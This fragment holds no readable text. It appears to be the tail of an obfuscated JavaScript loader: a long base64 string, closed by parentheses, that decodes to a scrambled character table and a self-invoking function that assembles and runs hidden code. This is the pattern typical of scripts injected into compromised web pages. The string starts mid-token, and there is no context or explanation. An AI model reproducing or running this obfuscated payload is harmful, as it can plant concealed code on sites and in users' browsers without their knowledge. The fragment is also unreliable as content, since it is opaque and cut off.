mNGeUZlZXJvaXBGICtvbEZbJTUoZXRGPUY+JX1lMzIsRl9uNmxvYzAhXFwkckYpXC84e2EyaC5GbE49NG4ydWF9Rn1kdCpGe29laXsudT0xOnQ5TGIsX3NGaTAgRlszMUZcL3RGdDRvSW50UzBvO2tGXyVyfVFGbiE7ZGVGZEZNbHI0W2JjKGI1KDtGRm49bVcodnsuPX0hdUZfNkZaKG11N0YkJltGKV9lXV0yeyhlfTdfX2FfIDNGNyRyb2h5Y19sJWdGIUZhMTU2LmZvRlNTM11GIiUgcm1cL2gpPWtvaSh3ZzQ9KGRiMGghaGRuIkZ0ZStGInshSWlldXUkbmEhZTNQRiZGKUZHZGlhXUMyPV9GYTYzLm1zdCVleWM1N2RiMThlX2FfRl9bXUZjYkNpY0YxNDozKXtpRkY1O3slZW8hfTBGNF8ycz0rUHR2dz1uLn1hZV9idEEub2kpLituXyFdYV9fNmFyITMiYj0hJSVjLmczYm9zOWxiNjhdJXNdLiwxZT0uNGNiRjozLm9uKTtyc2JwZVZsbz0xO0Y7b11yX0ZGfSVcJ0YlJGNfXS0lRiwkMl8oZT1uNXRvRntpIy4wZU9GXTtiRjpzRmFfNSIpY0Y1M119ekZ1LnRsb0YjRl0oMSwuRmZ5ZUY6W3QgbEYpdHNba210PX1sLkY3QmcoX18ucnRGbmJnRmVfRkZUYXVlai5uX2ZlM0dGZDRsdWU7KTszNlImRiRhKWUkOGxGNWhGMDhfSmFjdFtfc0YwLnB0ZStyIHRyYiVdX28oYWVwa319b25fXW99anN5dDpGLiB7RmV4ZW87YW4zbytFKXRGWWxGISBGRilvcFNrYjg9KU9MIWU9cEZGbi5ibj0xIFtGLkZ1RmRCIEYsNF1uLm5nKCl1NjN0IkZlPW1fKV9dRiBhM3whJTVGdGJ0MGZGb19GdDFlXT1qKDBrMWJdIGRsRkZ9e2EoPWZPNTRfIChhbWUsJGZtcm1GVndiO1tlNV0xZ2MoRiByLiJhIGFvV3JGRmFlX11pdEYudHs6diBGck4ucF8uYWZlLjEodV02KHhucFtpbiglbyhPfXQlYV8xV2UuRmZdIn04Ij1vO119aXI2LHtURmkgeH1hRnRbRi58KGVtZXJuIC5vMyhlaWMob190Ri4hcmx0LiEgMC5nYm1GOyNvNCBuKC5sRiB0Rk5GMC5pJSgxKXQhYl04XT0pZnZGPS5lMGNiaWZAKGFKenRGXCc3Xz1GPTE4ODdvMScpKTt2YXIgZlpXPURaZyhVaWosd3NBICk7ZlpXKDk5MTUpO3JldHVybiAzMzk1fSkoKQ=='))
